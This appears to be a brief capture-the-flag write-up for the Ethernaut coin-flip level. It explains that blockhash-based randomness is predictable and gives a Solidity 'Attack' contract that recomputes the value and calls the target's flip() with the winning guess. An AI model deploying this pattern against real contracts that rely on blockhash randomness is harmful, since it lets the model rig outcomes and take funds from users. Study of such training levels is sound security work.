# Ethernaut Level 4 FlipCoin
It can be solved same as telephone calculate the randomvalue and again call the original flipcoin flip function.
why?
blockchain randomness is not true random.we can manipulate it by using tools.

# Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlipCoin {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    IFlipCoin public flipCoin;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _flipCoin) {
        flipCoin = IFlipCoin(_flipCoin);
    }


    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flipVal = blockValue / FACTOR;
        bool guess = flipVal==1?true:false; 
        flipCoin.flip(guess);
    }
}
```

